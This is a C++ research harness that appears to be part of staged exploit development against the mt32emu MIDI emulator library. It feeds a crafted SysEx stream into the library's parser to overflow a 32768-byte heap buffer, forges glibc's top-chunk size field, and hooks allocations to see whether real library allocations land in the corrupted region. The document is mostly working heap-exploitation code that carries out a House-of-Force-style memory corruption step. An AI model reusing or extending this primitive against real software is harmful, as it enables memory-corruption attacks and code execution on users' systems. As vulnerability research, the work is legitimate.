// W183 bounded experiment: after the shaped overflow forges glibc's top-chunk
// size, does a REAL library allocation -- not a harness malloc -- land in the
// corrupted tail? Complete SysEx -> DefaultMidiStreamParser::handleSysex() ->
// Synth::playSysex() would reach MidiEventQueue::pushSysex() ->
// new Bit8u[sysexLength] (pinned Synth.cpp:2163), but only in an OPENED Synth.
// A synth without ROMs has midiQueue == NULL and playSysex() returns early;
// this driver records that fact and every allocation after the overflow via
// --wrap=malloc plus an operator new[] hook. Hooks only OBSERVE; they never
// consume corrupted metadata. Rung-4 mechanic only.
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>

#include "mt32emu.h"

using namespace MT32Emu;

static unsigned char *g_buf = NULL;
static size_t g_grows = 0;
static int g_armed = 0;
#define MAX_LOG 16
static unsigned char *g_new_ptr[MAX_LOG];
static size_t g_new_len[MAX_LOG];
static int g_new_count = 0;
static unsigned char *g_mal_ptr[MAX_LOG];
static size_t g_mal_len[MAX_LOG];
static int g_mal_count = 0;

extern "C" void *__real_malloc(size_t);

extern "C" void *__wrap_malloc(size_t n) {
	void *p = __real_malloc(n);
	if (g_armed && g_mal_count < MAX_LOG) {
		g_mal_ptr[g_mal_count] = static_cast<unsigned char *>(p);
		g_mal_len[g_mal_count] = n;
		++g_mal_count;
	}
	return p;
}

void *operator new[](size_t n) {
	void *p = __real_malloc(n);
	if (n == 32768 && g_buf == NULL) {
		++g_grows;
		g_buf = static_cast<unsigned char *>(p);
	}
	if (g_armed && g_new_count < MAX_LOG) {
		g_new_ptr[g_new_count] = static_cast<unsigned char *>(p);
		g_new_len[g_new_count] = n;
		++g_new_count;
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

// No stdio buffering or allocation after the overflow: vsnprintf into a
// stack buffer and write(2) directly.
static void emit(const char *fmt, ...) {
	char line[640];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

static void header(const char *label) {
	if (!g_buf) return;
	char hex[33];
	for (size_t i = 0; i < 16; ++i) snprintf(hex + 2 * i, 3, "%02x", g_buf[32768 + i]);
	hex[32] = 0;
	emit("%s=%s\n", label, hex);
}

static void wide(const char *label) {
	if (!g_buf) return;
	char hex[97];
	for (size_t i = 0; i < 48; ++i) snprintf(hex + 2 * i, 3, "%02x", g_buf[32768 + i]);
	hex[96] = 0;
	emit("%s=%s\n", label, hex);
}


static void log_allocs(const char *label, unsigned char **ptr, size_t *len, int count) {
	emit("%s count=%d", label, count);
	for (int i = 0; i < count; ++i) {
		long delta = g_buf ? (long)(ptr[i] - g_buf) : -1L;
		int inside = (delta >= 32768 && delta < 40001) ? 1 : 0;
		emit(" [%d]size%zu@%ld%s", i, len[i], delta, inside ? "*" : "");
	}
	emit("\n");
}

static void fill_attack(Bit8u *buf, bool shape) {
	memset(buf, 0x5a, 40001);
	buf[0] = 0xF0;
	if (shape) {
		// 0x10001: glibc top-chunk size with PREV_INUSE, encoded in eight
		// 7-bit attack bytes at stream offset 32776 (W179).
		const unsigned long long value = 0x10001ULL;
		for (size_t i = 0; i < 8; ++i) buf[32776 + i] = (Bit8u)(value >> (8 * i));
	}
}

static void fill_good(Bit8u *buf, Bit8u tag) {
	memset(buf, tag, 102);
	buf[0] = 0xF0;
	buf[1] = 0x41; // Roland
	buf[2] = 0x10; // device ID
	buf[3] = 0x16; // MT-32
	buf[4] = 0x20; // command
	buf[100] = 0x00; // checksum placeholder (framing suffices for enqueue)
	buf[101] = 0xF7;
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "shaped";
	const bool none = 0 == strcmp(mode, "none");
	const bool shaped = 0 == strcmp(mode, "shaped");
	const bool safe = 0 == strcmp(mode, "safe");

	Bit8u *attack = static_cast<Bit8u *>(__real_malloc(40001));
	Bit8u *good = static_cast<Bit8u *>(__real_malloc(102));
	fill_attack(attack, shaped);
	fill_good(good, 0x11);

	emit("mode=%s grows_before=%zu\n", mode, g_grows);
	Synth synth;
	DefaultMidiStreamParser parser(synth);

	if (!safe) parser.parseStream(attack, 40001);
	header("after_overflow");
	wide("after_overflow_wide");
	emit("grows=%zu buf=%p\n", g_grows, (void *)g_buf);
	g_armed = 1;
	if (!none) parser.parseStream(good, 102);
	log_allocs("after_good1_new", g_new_ptr, g_new_len, g_new_count);
	log_allocs("after_good1_malloc", g_mal_ptr, g_mal_len, g_mal_count);
	header("post_good1_header");
	wide("post_good1_wide");

	if (!none) parser.parseStream(good, 102);
	log_allocs("after_good2_new", g_new_ptr, g_new_len, g_new_count);
	log_allocs("after_good2_malloc", g_mal_ptr, g_mal_len, g_mal_count);

	emit("done grows=%zu\n", g_grows);
	_exit(0); // no destructors: forged metadata must not be touched at exit
}
